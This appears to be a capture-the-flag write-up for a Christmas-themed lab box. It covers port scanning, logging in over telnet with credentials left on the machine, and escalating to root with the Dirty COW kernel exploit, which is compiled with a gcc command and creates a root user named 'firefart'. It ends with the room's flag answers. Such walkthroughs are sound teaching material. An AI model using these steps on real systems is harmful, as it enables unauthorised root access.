### IP

`10.10.163.112`

### Port scanning

`sudo nmap -sV -sS 10.10.163.112`

```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
23/tcp  open  telnet  Linux telnetd
111/tcp open  rpcbind 2-4 (RPC #100000)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### What old, deprecated protocol and service is running?

`telnet`

### What credential was left for you?

I type `telnet 10.10.163.112` and there are credentials left.

`clauschristmas`

### What distribution of Linux and version number is this server running?

I can check that with:

```
 cat /etc/*release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=12.04
DISTRIB_CODENAME=precise
DISTRIB_DESCRIPTION="Ubuntu 12.04 LTS"
```

`Ubuntu 12.04`

### Who got here first?

`grinch`

###  What is the verbatim syntax you can use to compile, taken from the real C source code comments?

`gcc -pthread dirty.c -o dirty -lcrypt`

We are using dirtycow exploit which was saved on a box.

### What "new" username was created, with the default operations of the real C source code?

`firefart`

New user was created and has predefined password (set while running exploit), it also has root privileges:

```
firefart@christmas:~# id
uid=0(firefart) gid=0(root) groups=0(root)
```

### What is the MD5 hash output?

I checked root's home directory and there are two files:

```
firefart@christmas:~# ls -al
total 24
drwx------  2 firefart root 4096 Nov 21 20:38 .
drwxr-xr-x 24 firefart root 4096 Nov 21 20:38 ..
-rw-------  1 firefart root    0 Nov 21 20:38 .bash_history
-rw-r--r--  1 firefart root 3106 Apr 19  2012 .bashrc
-rwxr-xr-x  1 firefart root 1422 Nov 21 20:37 christmas.sh
-rw-r--r--  1 firefart root  611 Nov 21 20:37 message_from_the_grinch.txt
-rw-r--r--  1 firefart root  140 Apr 19  2012 .profile
```

In a message, John asks to create a file named `coal` so `touch coal` 
and then to pipe a result of `tree` command to `md5sum`:

```
firefart@christmas:~# tree | md5sum
8b16f00dd3b51efadb02c1df7f8427cc  -
```

`8b16f00dd3b51efadb02c1df7f8427cc` is the flag

### Conclusion

We can try getting user's credential  e.g with telnet, and while we are inside a system, perform an enumeration in order to  find a way for privilege escalation.

In this case, `Ubuntu 12.04` seemed to be vulnerable to `dirtycow` exploit which allowed to get root.

